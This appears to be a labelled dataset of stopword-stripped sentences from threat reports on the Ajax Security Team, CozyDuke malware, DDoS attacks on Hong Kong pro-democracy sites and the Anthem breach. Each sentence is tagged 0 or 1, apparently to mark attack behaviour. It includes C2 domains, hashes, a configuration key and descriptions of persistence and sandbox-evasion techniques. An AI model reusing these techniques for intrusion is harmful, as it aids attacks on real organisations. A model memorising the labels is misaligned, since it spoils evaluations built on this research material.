Both members engaged website defacements prior forming Ajax Security Team members Iranian hacker forums ashiyane [	0
] org shabgard [	0
] org	0
Other members include '' 0day '' '' Mohammad PK '' '' Crim3r ''	0
The Ajax Security Team website ajaxtm [	0
] org Web forum least 236 members	0
The group published several exploits content management systems engaged defacements	0
Initially defacements seemed motivated desire demonstrate group 's prowess-they even defaced Iranian government website	0
However group appears become increasingly political	0
For example blog post 2012 '' Cair3x '' announced targeting Iran's political opponents	0
In 2013 Ajax Security Team '' HUrr c4nE '' particular took part '' # OpIsrael '' '' # OpUSA ''	0
By early 2014 Ajax Security Team appears dwindled	0
There defacements since December 2013	0
The website forum ajaxtm [	0
] org operated '' HUrr c4nE '' aka '' k3yv4n '' longer active	0
'' HUrr c4nE '' open/documented Internet persona Ajax Security Team	0
He registered ajaxtm [	0
] org domain name using email address keyvan.ajaxtm @ gmail [	0
] com	0
This also email address used register domain aerospace2014 [ ] org used spear phishing attacks companies U.S. linked malware activity directed users anti-censorship tools Iran	1
'' HUrr c4nE '' features prominently group 's activities defacements	0
Although decline public-facing Ajax Security Team activity coincides increase malware activity linked group 's infrastructure	0
The increasing politicization Ajax Security Team aligns timing activities perceived enemies Iran	0
In addition attacking companies U.S. targeted domestic users anti-censorship technology	0
While objectives group consistent Iran 's efforts controlling political dissent expanding offensive cyber capabilities relationship group Iranian government remains inconclusive	0
For example Ajax Security Team could using anti-censorship tools lure popular Iran order engage activities would considered traditional cybercrime	1
In one case '' HUrr c4nE '' using email address keyvan.ajaxtm @ gmail [	0
] com flagged possible fraud online retailer	0
While '' HUrr c4nE '' engaged operations align Iran 's political objectives may also dabbling traditional cybercrime	0
This indicates considerable grey area cyber espionage capabilities Iran's hacker groups direct Iranian government military involvement	0
On spectrum state responsibility attacks align state-encouraged attacks defined attacks Third parties control conduct attack national government encourages matter policy	0
Recruiting hackers model allows Iran influence activities provides Iranian government plausible deniability lack direct control also means groups may unpredictable engage unsanctioned attacks	0
The increased politicization Ajax Security Team transition nuisance defacements operations internal dissidents foreign targets coincides moves Iran aimed increasing offensive cyber capabilities	0
While relationship actors Ajax Security Team Iranian government unknown activities appear align Iranian government political objectives	0
The capabilities Ajax Security Team remain unclear	0
This group uses least one malware family publicly available	0
We directly observed Ajax Security Team use exploits deliver malware unclear Iranian actors capable producing acquiring exploit code	0
While Ajax Security Team 's capabilities remain unclear know current operations somewhat successful measured number victims seen checking Ajax Security Team controlled CnC server	0
We believe actors continue current pace operations improve capabilities mid-term	0
FireEye invented purpose-built virtual machine-based security platform provides real-time threat protection enterprises governments worldwide next generation cyber attacks	0
These highly sophisticated cyber attacks easily circumvent traditional signature-based defenses next-generation firewalls IPS anti-virus gateways	0
The FireEye Threat Prevention Platform provides real-time dynamic threat protection without use signatures protect organization across primary threat vectors across different stages attack life cycle	0
The core FireEye platform virtual execution engine complemented dynamic threat intelligence identify block cyber attacks real time	0
FireEye 1,500 customers across 40 countries including 100 Fortune 500	0
We thank Kenneth Geers Jen Weedon support analysis findings	0
TLP WHITE This whitepaper provides overview CozyDuke set tools used one malicious actors performing targeted attacks high profile organizations governmental organizations entities work closely institutions	0
The CozyDuke toolset believe active development since least 2011 consists tools infecting targeted hosts establishing maintaining backdoor access hosts gathering information gaining access hosts inside victim organization	1
Based command control ( C&C ) server information found used CozyDuke tools believe CozyDuke toolset used least one malicious actor also uses least shares infrastructure actors using known threats MiniDuke OnionDuke	0
F - SECURE LABS SECURITY RESPONSE Malware analysis Whitepaper CozyDuke referred document set tools used one malicious actors performing targeted attacks high profile organizations	0
The core CozyDuke toolset modular attack platform consisting main component augmented set additional modules implementing functionality	0
The CozyDuke toolset also includes multiple kinds droppers infecting hosts CozyDuke executing additional tools CozyDuke toolset	1
Finally CozyDuke toolset includes tools scripts – custom - written others based openly available tools – used purposes gathering information infected hosts infecting additional hosts target organization	1
We observed CozyDuke spread via email usually contain link compromised website hosting ZIP file ( although least one case file hosted Dropbox )	1
These files contain executable upon execution write disk execute CozyDuke time presenting user decoy divert attention	1
The decoy usually uninteresting PDF also observed Flash video monkeys presented decoy	0
We reason believe CozyDuke used target governmental organizations entities work closely bodies	0
We believe current CozyDuke activity started end January 2015	0
Most samples observed compiled beginning end January	0
However based comparisons recent CozyDuke samples older samples obtained dating back far end 2011 believe CozyDuke active development since least 2011	0
We strong evidence suggesting group using CozyDuke - least shares command control infrastructure - group groups using MiniDuke OnionDuke	0
Firstly CozyDuke sample February 2012 attempts contact C&C server nostressjob.com	0
This domain previously associated known MiniDuke C&C infrastructure	0
This infrastructure also seen use OnionDuke	0
Secondly also reason believe CozyDuke instances downloaded executed droppers DLL files reminiscent OnionDuke	1
Specifically DLLs dropped used file export names also used OnionDuke	0
Additionally strings DLLs encrypted using algorithm used OnionDuke	0
This link however conclusive infrastructure overlap	0
Infection CozyDuke begins victim receiving email containing link ZIP file	0
This ZIP file contain single executable usually self - extracting RAR archive	0
Upon execution write two files disk	1
The first file decoy	0
The decoy usually PDF document Flash videos also observed cases	0
The second file extracted archive CozyDuke dropper	0
This dropper proceed write disk main CozyDuke components well encrypted configuration file used CozyDuke	1
The main CozyDuke dropper used infecting hosts CozyDuke begins checking whether victim anti - virus product installed	1
Should installed product found compared predetermined list product names	0
If installed product matches name list dropper immediately exit	0
Newer versions dropper perform additional checks ensure dropper executed inside virtual machine known malware analysis sandbox environment	1
Should either checks fail dropper likewise exit immediately	0
Next dropper find decrypt encrypted data stored two PE resources embedded executable	0
These resources named hexadecimal identifiers 0x000A 0x000B.	0
Both resources structured similarily	0
They begin four - byte value specifying length included decryption key	0
This decryption key immediately follows length field	0
Finally rest resource encrypted payload	0
The encryption used simple XOR rotating key	0
The first resource 0x000A contains payload Microsoft cabinet archive	0
This archive contains CozyDuke components dropper later install victim system	0
The second resource 0x000B contains payload XML file instructions dropper install dropped components name	0
The dropper proceed write CozyDuke components specified location	1
The dropper additionally copy system file rundll32.exe install location CozyDuke	1
This file also use name specified droppers configuration file	0
Finally dropper use copy rundll32.exe load execute CozyDuke main component	1
The main component CozyDuke DLL file responsible orchestrating CozyDuke 's activity victim machine	0
The main component executed CozyDuke dropper using copy rundll32.exe	1
The entrypoint function varies always specified dropper configuration	0
The important functionalities offered main component establishment persistence gathering basic system information communication C&C server execution additional tasks modules executables commanded C&C server	1
CozyDuke may use multiple techniques establishing persistence ; following one technique used	0
Firstly CozyDuke may set executed system startup adding registry value following registry keys The name registry value usually filename ( without extension ) CozyDuke main component	1
CozyDuke may also register Windows service scheduled task	1
Additionally CozyDuke may utilize technique known COM - object hijacking [ 1 ] establish persistence	0
To achieve CozyDuke " hijack " registry entries COM object " SharedTaskScheduler "	1
CozyDuke modify registry entries way loading SharedTaskScheduler COM object first load special CozyDuke module ensure CozyDuke stays active victim host	1
The configuration data CozyDuke stored separate RC4-encrypted file written disk CozyDuke dropper initial infection	0
The name encrypted configuration file disk racss	0
dat observed cases	0
The decrypted file formatted XML UTF-16LE character encoding	0
In CozyDuke samples 2015 configuration data encrypted RC4 key B5 78 62 52 98 3E 24 D7 3B C6 EE 7C B9 ED 91 62	0
In CozyDuke samples July 2014 RC4 key embedded encrypted configuration file	0
In case encrypted configuration file begin 4-byte value specifying length included RC4 key	0
This followed actual key	0
Finally rest file actual configuration data	0
CozyDuke 's main method communicating command control server using either HTTP HTTPS	1
The method communication well address connect specified CozyDuke 's configuration data	0
In cases observed configuration data single CozyDuke instance included details either one two C&C servers	1
Listed details known CozyDuke C&C servers	0
We believe ones listed compromised servers	0
In addition main communication method CozyDuke also features ability use Twitter backup C&C channel	0
In cases CozyDuke utilizes functionality twitter account used specified CozyDuke 's configuration data	0
We observed two samples backup Twitter account actually specified configuration data	0
These accounts @US2515 @monkey_drive	0
Tasks CozyDuke 's primary purpose execution tasks	1
These tasks usually involve execution modules executables providing additional functionality	1
The main difference two modules DLL files loaded memory CozyDuke main component whereas executables PE executable files CozyDuke write disk execute	0
For purpose managing tasks main component CozyDuke implements 6 commands C&C server specify	1
These commands briefly described Table 2 ( overleaf )	0
The following chapter CozyDuke Tasks provides information tasks CozyDuke observed executing	0
Based samples obtained collections generously shared us trusted source able identify tasks executed recently CozyDuke	0
These tasks divided two categories	0
The first consists CozyDuke modules DLL files loaded memory main component CozyDuke purposes extending CozyDuke 's functionality	1
The second category consists PE executable files CozyDuke write disk execute infected host	1
These executables usually droppers similar used infect host CozyDuke	0
In case however instead dropping CozyDuke executables may drop executables scripts DLLs	1
Once executed CozyDuke executables function independently CozyDuke 's main component	0
Listed modules observed used We observed executables executed CozyDuke following purposes	0
These executables implement methods C&C communication data exfiltration	0
In many cases scripts utilized Microsoft OneDrive accounts data transfer	0
The earliest CozyDuke sample observed far compiled 29th December 2011	0
The sample question actual CozyDuke main component CozyDuke module	0
The earliest main component observed compiled 29th February 2012	0
The main component question stores strings configuration unencrypted form	0
Additionally configuration stored embedded binary separate XML file manner newer CozyDuke versions	0
Even oldest main component however use XML purposes via open - source Pugi - XML library	0
The next CozyDuke main component observed compiled 30th November 2012	0
By authors switched encrypting strings configuration	0
However configuration still stored embedded binary	0
Design - wise sample bit outlier	0
Instead DLL file main component actually EXE addition configuration embeds multiple DLLs provide additional functionality main component	0
Apart different design functionally main component similar CozyDuke main components	0
It possible authors CozyDuke trying new design eventually decided go back original	0
The next CozyDuke main component observed compiled 2nd July 2014 DLL file	0
By authors CozyDuke switched embedded configuration external XML- formatted configuration file seen today	0
We yet observe samples 2013 believe CozyDuke active development well year	0
Between 2012 2014 authors CozyDuke appear performed significant refactoring CozyDuke codebase even though functionally differences smaller	0
Examples refactoring include instance switch using Pugi - XML library using Microsoft 's MSXML 3.0 XML - related functionality	0
The latest CozyDuke main component observed compiled 26th February 2015	0
The core functionality latest sample similar previous sample July 2014 authors CozyDuke implemented lot additional functionality increase size 279 KB 820 KB would also suggest	0
Based logging strings variable naming PDB strings found CozyDuke samples observed following	0
PDB strings found early CozyDuke samples listed Table 4 ( )	0
APPENDIX A | SAMPLE HASHES Filenames ( Note believe many borrowed legitimate files ) User agent strings Mutexes	0
As pro-democracy movement Hong Kong continued 've watching indications confrontation taking place cyberspace	0
Protests began September continued escalate	0
In recent weeks attackers launched series Distributed Denial Service attacks ( DDoS ) websites promoting democracy Hong Kong	1
According Wall Street Journal websites belonging Next Media 's Apple Daily publication suffered ongoing DDoS attack '' brought email system hours ''	1
According reports Next Media 's network suffered '' total failure '' result attacks	1
Additionally least one member popular online forum HKGolden arrested posting messages encouraging support OccupyCentral Pro Democracy movement	0
The use DDoS attacks political tool times conflict new ; patriotic hacktivist groups frequently use means stifle political activity disapprove	0
The question state sponsorship ( least tacit approval ) online crackdowns often debate ambiguous technical evidence tradecraft perspective	0
In case however 've discovered overlap tools infrastructure used China-based advanced persistent threat ( APT ) actors DDoS attack activity	0
We believe DDoS attacks linked previously observed APT activity including Operation Poisoned Hurricane	0
This correlation sheds light potential relationships symbiosis tool sharing patriotic hacker activities designed disrupt anti-government activists China APT activity consistently see IP theft espionage-focused	0
FireEye identified number binaries coded receive instructions set command control ( C2 ) servers instructing participating bots attack Next Media-owned websites HKGolden forum	1
Next Media large media company Hong Kong HkGolden forum used platform organize pro-democracy protests	0
Each sample identified signed digital certificates also used APT actors sign binaries previous intrusion operations These binaries W32 Cabinet self-extracting files drop variant older DDoS tool known KernelBot	1
All samples identified '' NewVersion '' value 20140926	0
Structurally samples similar drop three files The KernelBot implants receive targeting instructions C2 servers hard-coded directly sample	1
For example c3d6450075d618b1edba17ee723eb3ca drops KernelBot variant connects www.sapporo-digital-photoclub [ ] com wakayamasatei [ ] com	1
The full list C2 servers identified follows On Oct. 21 control server wakayamasatei [	0
] com responded following encoded configuration file This configuration file decoded stripping leading trailing @ $ @ characters	0
At point simple base64 XOR decode reveal plaintext configuration	0
The following snippet python code used decode command FireEye observed two different single-byte XOR keys used encode configuration files issued DDOS C2 servers campaign	1
The two different keys 0x2A 0x7E	0
The encoded configuration file shown decodes During course research 've observed 30 different unique configuration files issued C2 servers listed	1
These configurations issued commands attack following domains IPs All IPs host Next Media Apple daily websites exception 58.64.139.10 124.217.214.149	1
The IP 58.64.139.10 hosted hkgolden [	0
] com – domain HKGolden forum mentioned	0
For approximately 14 hours October 23rd 24th attackers pushed configuration update four controls servers instructed bots control flood 124.217.214.149 UDP traffic	1
The IP 124.217.214.149 hosted attacker controlled domain p.java-sec [	0
] com	0
On Oct. 23 2014 two active controls began instructing participating bots cease attacks	1
By Oct. 24 2014 five known active control servers issuing commands cease attacks	1
It come surprise hkgolden [	0
] com nextmedia [	0
] com appledaily.com [	0
] hk websites previously blocked Great Firewall China – indicating PRC found content hosted sites objectionable	0
The direct connection DDoS attacks previous APT activity use QTI International CallTogether code signing certificates seen malware attributed APT activity	0
The QTI International digital certificate previously used sign binaries used APT activity including Operation Poisoned Hurricane	0
Specifically 17bc9d2a640da75db6cbb66e5898feb1 PlugX variant signed QTI International certificate	0
This PlugX variant connected Google Code project code.google [ ] com/p/udom/ decoded command configured C2 server	1
The sample 0b54ae49fd5a841970b98a078968cb6b signed QTI International certificate well	0
This sample first observed drive-by attack June 2014 downloaded java-se [	0
] com/jp.jpg	0
This sample detected Backdoor.APT.Preshin connected luxscena [ ] com C2	1
The QTI International certificate also used sign e2a4b96cce9de4fb126cfd5f5c73c3ed	0
We detect payload Backdoor.APT.PISCES used hk.java-se [ ] com C2	1
The java-se [	0
] com website previously used attacks targeting pro-democracy movement Hong Kong	0
We first observed presence malicious javascript inserted Hong Kong Association Democracy People's Livelihood June 26 2014 appeared following More recently noted Claudio Guarnieri website Democratic Party Hong Kong seen hosting redirect malicious javascript	0
The CallTogether certificate used sign ecf21054ab515946a812d1aa5c408ca5	0
We also detect payload Backdoor.APT.PISCES observed connect u.java-se [ ] com	1
Both certificates valid detected blocked via following Yara signatures These ongoing DDoS attacks previous APT intrusion activity target hkgolden [ ] com website	1
As noted site targeted DDoS attack KernelBot network	1
We also found hkgolden [	0
] com website compromised Sept. 5 2014 redirect malicious javascript hosted another jave-se [	0
] com host appeared follows Finally noted IP 124.217.214.149 seen hosting domain p.java-sec [	0
] com Oct. 25 2014 Oct. 27 2014	0
As Brandon Dixon noted java-sec [	0
] com domain linked java- se [	0
] com shared hosting history following IP address It unclear actors would attack IP address actively using	0
It 's possible attackers wanted test botnet 's capability attacking IP using gather statistics size attack	0
It also possible attackers simply made mistake accidentally issued commands attack infrastructure	0
On Oct. 24 2014 attacking infrastructure attackers issued new instructions botnet ceased attacks	1
While conclusive evidence presented shows link confirmed APT activity ongoing DDoS attacks appear designed silence Pro Democracy movement Hong Kong	0
The evidence conclusively prove actors responsible DDoS attacks also behind observed intrusion activity discussed – Operation Poisoned Hurricane	0
Rather evidence may indicate common quartermaster supports DDoS attacks ongoing intrusion activity	0
In either scenario clear connection intrusion activity documented Operation Poisoned Hurricane DDOS attacks documented	0
While tactics activities different technical perspective supports distinct political objectives	0
Operation Poisoned Hurricane 's objective appeared part IP theft possibly economic gain competitive advantages	0
In DDOS attacks objective silence free speech suppress pro democracy movement Hong Kong	0
The Chinese government entity likely interested achieving objectives	0
This entry posted Threat Intelligence Threat Research tagged advanced malware Cybersecurity malware zero-day Ned Moran Mike Oppenheim Mike Scott	0
Bookmark permalink	0
Posted February 27 2015 ThreatConnect Intelligence Research Team ( TCIRT)[1 ] �led Threat Research[2 ]	0
UPDATE Premera Latest Healthcare Insurance Agency Breached[3 ] When news Anthem breach reported February 4th 2015 security industry quite understandably went wild	0
A breach magnitude certainly unprecedented	0
Naturally many industry professionals keenly interested digging incident see could uncovered research team ThreatConnect exception	0
Thanks powerful API[4 ] third - party partner[5 ] integrations able use ThreatConnect quickly uncover wealth intelligence even initially hindered relative lack investigative lead information context key requirement Threat Intelligence Platform[6 ] ( TIP )	0
However delve able uncover let 's brie�y review facts stood wake initial discovery announcement	0
On morning February 4th 2015 several major news outlets broke story[7 ] Anthem Inc. 's network defenses breached	0
According statement Anthem 's CEO[8 ] company fell victim " sophisticated external cyber attack " hackers " obtained " personally identi�able information ( PII ) approximately 80 M customers	0
This included social security numbers birthdays street addresses phone numbers income data – plenty information enable identity theft	0
This signi�cant event several reasons	0
Anthem formerly known Wellpoint largest managed healthcare company Blue Cross Blue Shield Association extension one largest healthcare organizations United States	0
As compromise matter insigni�cant would likely impact countless individuals	0
Blue Cross Blue Shield provides healthcare coverage half U.S.	0
federal workforce	0
This means information potentially compromised	0
Unlike Sony hack destructive nature meant send message coercive purposes Anthem compromise purportedly covert fact may suggest something adversary 's motives	0
As late February 2015 indications ex�ltrated PII data immediately commoditized black market purpose enabling identity theft case Home Depot Breach	0
Obviously high - level observations provide cybersecurity researchers great deal information work	0
However presented within context Threat Intelligence Platform ( TIP ) incomplete trail evidence highlight intelligence gaps study orient threat researchers towards analytic objectives	0
To end let 's examine wanted discover context Anthem breach Who responsible attack ? What objective attack ? Was cyber theft espionage operation something different ? Who targeted attack ? The answer question obscured may would likely shed light objective breach	0
What timeline activity ? The real power Threat Intelligence Platform demonstrated able collect maintain robust dataset threat indicators past present help orient right direction wake newly discovered breach	0
Even good deal information start ( example �le hash IP address ) may �nd leads pivoting archived datasets uncover key pieces puzzle	0
In case Anthem breach able	0
In September 2014 ThreatConnect Intelligence Research Team ( TCIRT)[9 ] observed variant Derusbi APT malware family MD5 0A9545F9FC7A6D8596CF07A59F400FD3[10 ] signed valid digital signature Korean company DTOPTOOLZ Co.	0
Derusbi family malware used multiple actor groups associated exclusively Chinese APT	0
TCIRT began tracking DTOPTOOLZ signature additional signed malware samples memorialized within Threat Intelligence Platform time	0
Analyst Comment The DTOPTOOLZ signature also observed association Korean Adware af�liated actual DTOPTOOLZ Co.	0
This adware confused APT malware abusing digital signature	0
Later mid - November discovered another implant digitally signed DTOPTOOLZ signature	0
This implant MD5 98721c78dfbf8a45d152a888c804427c[11 ] " Sakula " ( aka	0
Sakurel ) family malware known variant Derusbi backdoor con�gured communicate malicious command control ( C2 ) domains extcitrix.we11point[.]com www.we11point[.]com	0
Through Farsight Security passive DNS[12 ] integration uncovered malicious infrastructure likely named way impersonate legitimate Wellpoint IT infrastructure	0
Passive DNS historic DomainTools Whois data also provided insights helped establish initial timeline dating back April 2014 faux domains came existence later operationalized attackers	0
A Threat Intelligence Platform allow analysts easily put together organize insights collaborate around relevant analysis internally share �nished analysis external industry groups organizations	0
In hopes community members could bene�t provide insight suspicious incident immediately shared threat intelligence including indicators signatures analytical context ThreatConnect Medical Health Community[13 ] November 13 2014	0
This included sending noti�cation stakeholders well followers Twitter[14 ]	0
When Anthem breach later came light early February - shared signatures indicators context freely entire ThreatConnect user base	0
As dug expanded understanding malicious we11point[.]com infrastructure taking particular interest subdomains " extcitrix.we11point[.]com " hrsolutions.we11point[.]com "	0
Note " citrix " " hr " ( human resources ) pre�xes adversary used mirror legitimate remote infrastructure employee bene�ts resources May 2014 timeframe	0
This provided initial insights likely targeting themes vectors adversary may used initiating targeting campaign	0
[ 15 ] The fact malicious infrastructure closely mirrored legitimate Wellpoint infrastructure supported hypothesis Derusbi / Sakula malware con�gured operate persist within speci�c target enterprise	0
Retrospective analysis targeted malware samples using DTOPTOOLZ Co.	0
digital signature led identi�cation " HttpBrowser " / " HttpDump " implant MD5 02FAB24461956458D70AEED1A028EB9C[17 ] ( OpenOf�cePlugin.exe ) �rst observed December 11 2013	0
Although malware sample Derusbi / Sakula strongly believed associated Chinese APT activity fact may also involved Blue Cross Blue Shield targeting campaign early December 2013	0
This particular binary con�gured connect static IP address 142.91.76[.]134	0
Passive DNS IP indicates December 11th 2013 date malware sample observed domain prennera[.]com also resolved 142.91.76[.]134	0
It believed prennera[.]com domain may impersonating Healthcare provider Premera Blue Cross[19 ] attackers used character replacement technique replacing " " two " n " characters within faux domain technique would seen �ve months later we11point[.]com command control infrastructure	0
Section Summary The Derusbi / Sakula malware implant types unique traditionally seen within Chinese APT espionage campaigns	0
The " HttpBrowser " / " HttpDump " malware implant ( different family malware Derusbi / Sakula ) also believed Chinese origin also digitally signed DTOPTOOLZ digitalsignature	0
This implant connected C2 node overlapped prennera[.]com	1
We believe prennera[.]com domain may impersonating Premera Blue Cross ( premera.com ) using similar character replacement technique seen we11point[.]com campaign	0
Another powerful attribute ThreatConnect ability analysts logically group items atomic indicators related documents signatures may include individualized custom context enrichments associations	0
Over time ability memorialize groupings related like activity allows analysts quickly uncover non - obvious relationships within private datasets	0
This exactly happened continued investigate incidents	0
As industry analysts media speculated Chinese APT involvement[20 ] Anthem breach focus Derusbi / Sakula malware signed DTOPTOOLZ Co.	0
digital signature shifted we11point[.]com incident another cluster activity occurred later May 2014	0
We immediately reviewed Incident 20140526B vaeit APT[21 ] incident initially shared Subscriber Community September 29 2014 conducting retrospective analysis	0
[ 22 ] Just case we11point[.]com prennera[.]com incidents VAE Inc.	0
incident also believed associated Chinese APT espionage activity	0
In case adversary also used Derusbi / Sakula malware signed DTOPTOOLZ Co.	0
digital signature con�gured communicate faux infrastructure appearing masquerading internal resources Department Defense Contractor VAE Inc.	0
Additionally response inquiry KrebsOnSecurity VAE Inc.	0
would later con�rm[24 ] indeed target failed spearphishing attempt May 2014 used malicious faux VAE Inc.	0
themed domain	0
The targeted incident relied upon Sakula executable MD5 230D8A7A60A07DF28A291B13DDF3351F[25 ] XOR 0x9A encoded C2 callbacks IP address 192.199.254[.]126 ( registered Wehostwebsites[.]com – " Tom Yu " Baoan Shenzhen City Guangdong Province China ) well hardcoded callback sharepoint - vaeit[.]com	0
Passive DNS static C2 IP 192.199.254[.]126 revealed single suspicious domain interest – topsec2014[.]com	0
This domain historic resolution around May 8 2014 within month �rst observed Sakula activity using IP 192.199.254[.]126 C2	0
[ 26 ] [ 27 ] Using historic Whois discovered topsec2014[.]com initially registered li2384826402@yahoo[.]com May 6th 2014	0
Although li2384826402@yahoo[.]com registrant likely reseller given observed registering several thousands domains fact used register faux VAE Inc.	0
C2 infrastructure overlapping domain topsec2014[.]com within month suggests may relationship client reseller VAE Inc.	0
infrastructure client topsec2014[.]com	0
[ 28 ] [ 29 ] Just four minutes initial registration topsec2014[.]com Whois records updated initial registrant Li Ning – li2384826402@yahoo[.]com TopSec China – TopSec_2014@163[.]com	0
This domain record unchanged since May 7th 2014	0
The we11point[.]com infrastructure extension faux VAE Inc.	0
infrastructure associated Cluster 2 ScanBox framework[30 ] PwC.	0
The latest PwC update ScanBox states " links domain allegedly used Anthem hack ( we11point.com ) Cluster 2 shared WHOIS details " setion One notable pattern domain Whois registration information VAE Inc.	0
themed infrastructure quickly updated obfuscated pseudorandom 10 character gmx.com email addresses using names various comic book characters Iron Man franchise	0
This comic - themed naming convention previously documented friends Crowdstrike[31 ] characterize associated Chinese APT group dubbed " Deep Panda "	0
Leveraging DomainTools partnership able correlate outlier domain opm - learning[.]org	0
This domain also purportedly registered Iron Man movie hero " Tony Stark " July 28 2014	0
This infrastructure naming convention suggests possible Of�ce Personnel Management ( OPM ) theme	0
However case lacked speci�c sample malware verify initial suspicions infrastructure operational	0
The possible OPM reference domain name noteworthy considering revealed July 2014 OPM compromised[32 ] likely state - sponsored Chinese actor mid - March year	0
The fact domain registered breach occurred suggests OPM could ongoing direct target Chinese state - sponsored cyber espionage activity	0
Our attention turned FBI Flash Report A-000049- MW[33 ] publicly reported Brian Krebs [ 34]on February 6th 2015	0
This FBI Flash Report issued January 27th 2015 day Anthem administrator detected suspicious activity according internal memo[35 ]	0
This memo goes indicate FBI would party Anthem breach noti�ed January 29th 2015 ; based facts assess high con�dence unlikely FBI Flash Report directly related Anthem breach	0
Rather suspect FBI �ash report likely references USIS breach announced[36 ] August 6 2014 previous OPM breach considering statement breach involved " compromised stolen sensitive business information Personally Identi�able Information ( PII ) US commercial government networks cyber espionage " The malware referenced within FBI Report associated Derusbi backdoor subvariant named " InfoAdmin " / " Kakfum " FBI speci�cally references open source reporting " Deep Panda " related malware observed attack	0
The malicious infrastructure highlighted report domains images.googlewebcache[.]com smtp.outlookssl[.]com	0
Both top level domains included related domains shared September 16th 2013 ThreatConnect Subscriber Community Incident 20130823C Some Trouble APT Domains[37 ] roughly year half prior FBI Flash report	0
It important mention domains images.googlewebcache[.]com smtp.outlookssl[.]comas also previously identi�ed October 2014 PwC blog post[38 ] seen within Cluster 1 Scanbox framework Sakula activity we11point VAEIT contained within Cluster 2 report	0
This implies actor referenced within FBI Flash report uses shared capabilities ( case ScanBox kit ) Sakula / we11point actor	0
Section Summary The Derusbi / Sakula malware seen we11point[.]com VAE Inc.	0
campaigns structurally digitally signed DTOPTOOLZ signature	0
The emerging theme particular signature family malware highly indicative particular Chinese APT activity	0
Within web malicious infrastructure interesting overlap topsec2014[.]com domain attack infrastructure	0
TCIRT identi�ed domain opm - learning[.]org similar superhero themed WHOIS registrant Sakula / VAE Inc.	0
infrastructure	0
The possible OPM reference noteworthy considering Of�ce Personnel Management ( OPM ) compromised March 2014	0
Additionally FBI Flash Report 0000 - 49MW referenced indicators possibly associated USIS hack Derusbi variant called " Kakfum " / " InfoAdmin "	0
Both FBI Flash infrastructure Sakula / VAE Inc.	0
infrastructure tied capability usage ScanBox framework residing Clusters 1 2 respectively	0
The Professor We conducted open source research pursuit information TopSec_2014@163[.]com email registrant	0
A keyword search returned several results " topsec2014@163[.]com " association number academic institutions Nanjing China	0
Although email address n't exact match topsec2014[.]com domain registrant ( notice absence underscore ) similarity warranted investigation	0
[ 39 ] [ 40 ] http://www.threatconnect.com / news / - anthem- ...	0
We examined links relevant intelligence discovered nearly search results led pages contained announcement information security competition sponsored Southeast University - Topsec Information Security Mobile Internet Technology Joint Research Center	0
This entity appears joint research venture University Chinese networking giant Beijing Topsec Network Security Technology Co. a.k.a	0
Beijing Topsec	0
[ 41 ] [ 42 ] The announcements list Professor " Song Yubo " point contact event directs interested parties email address topsec2014@163[.]com questions	0
[ 43 ] [ 44 ] According LinkedIn page Song Teacher Southeast University speci�cally interested �eld telecommunications	0
Additionally avid researcher published numerous academic papers computer network exploitation various e - journal publication sites Google Scholar[45 ]	0
Further lists skills " cryptography " " penetration testing " " computer network security " etc	0
Research Gate pro�le[46 ]	0
[ 47 ] [ 48 ] As continued develop pro�le Professor Song began sense interest information security research strongly overlapped someone might interested least capable conducting sophisticated cyber attacks	0
However interests alone enough warrant reasonable suspicion digging	0
Additionally soft link TopSec_2014@163[.]com topsec2014@163[.]com alone suf�cient make associations reasonable con�dence turns Yubo fact previously named person interest context offensive Chinese cyber activity	0
In March 2012 Northrop Grumman presented commissioned report Congress[49 ] detailing Chinese cyber warfare capabilities	0
The report asserts high con�dence Song Information Security Research Center Southeast University received numerous state - sponsored research grants extension cooperated Government China conducting information security research development ( R&D )	0
As stated Southeast University 's website main purpose grants develop technical acumen amongst students via providing support " state - owned scienti�c research institutions state key enterprises government agencies People 's Liberation Army ( PLA ) units " [ 50 ] [ 51 ] Southeast University one three Chinese academic institutes receives funding �ve State grant programs	0
Song also conducted fair share state- sponsored research notably National Ministry State Security 115 Program – highly sensitive research grant fund ambiguous information warfare R&D almost certainly support PLA programs	0
As see evidence continued stack	0
The real smoking gun however began notice strong temporal overlap various stages TOPSEC Cup Song Beijing Topsec organizing registration dates malicious infrastructure well malware compilation dates	0
[ 52 ] [ 53 ] Based upon translated registration form obtained Song Yubo 's personal Baidu document sharing account open registration " TOPSEC Cup " began May 4th 2014 would close May 14th 2014	0
The details competition shared announcement extremely ambiguous probably good reason	0
The introductory paragraph mentions primary goal event facilitate training discovery new talent noting exceptional participants would receive priority consideration internships jobs Beijing Topsec	0
The event broken several distinct rounds competition	0
Firstly preliminary round required eligible registrants would attempt remotely access navigate network	0
Should participating team perform exceptionally preliminary qualifying round would invited participate �nal round - site Nanjing	0
In �nal round participants would required build " information systems network environments " The announcement notes students must rely upon laptop software tools accomplish task	0
Further announcement notes participants prohibited attacking provided server well competitors	0
Section Summary Song Yubo research center Southeast University appear central players narrative highlighted �nancial connections government China particular Ministry State Security ( MSS ) China 's premier human intelligence agency	0
If MSS involved deduce Anthem hack could purposes gathering sensitive information follow - HUMINT targeting via blackmail asset recruitment technical targeting operations individuals home	0
Song 's use topsec email alias suggests greater association w/ TOPSEC	0
It seems competition almost certainly cause topsec2014[.]com domain	0
What curious however initial registration reseller li2384826402@yahoo[.]com tactic seen within con�rmed malicious faux VAE Inc.infrastructure	0
The overlap competition website static command control infrastructure seen Derusbi / Sakula implant likely error made attackers	0
The Company To enhance open - source capabilities partnered Dr.	0
James Mulvenon[54 ] team China experts Defense Group Inc.	0
( DGI)[55 ]	0
We shared everything knew time walking technical details led us way Song Yubo competition announcement	0
From able uncover wealth consequential background information Beijing Topsec Technology Co ( Beijing Topsec ) sponsoring organization Song Yubo 's information security competition	0
DGI 's research indicated Beijing Topsec one largest information security hardware providers China	0
In 1996 �rst Chinese company break market release China 's �rst indigenously - manufactured �rewall	0
Since expanded business include consulting practice focused issues vulnerability mining software code analysis threat intelligence encryption R&D amongst things	0
The company served core technical support unit network security 2008 Olympic Games – event tightly controlled state	0
Additionally Beijing Topsec known partner Chinese military	0
Since 2009 company possessed information publication credentials military network procurement	0
Since 2013 publicly recognized Chinese equivalent cleared defense contractor	0
The links Beijing Topsec Chinese government fairly substantial highlighted long - standing partnerships even shadowy elements Chinese military	0
The Leaked Cable A compelling piece evidence found contents leaked 2009 diplomatic security cable Department State published The Guardian.[56 ] The cable daily digest Diplomatic Security alerts – essentially situational awareness primer State Department employees inform new existing threats	0
In one section cable highlights Founder Beijing Topsec He Weidong openly talked receiving directives PLA interview China News Network	0
In interview founder quite curiously states Topsec less commercial entity rather research institute company received half start - capital directly PLA	0
The cable claims Topsec actively recruits PLA cyber army	0
[ 57 ] [ 58 ] It would also appear Beijing Topsec deep ties state - run cyber activity also within independent hacker community well	0
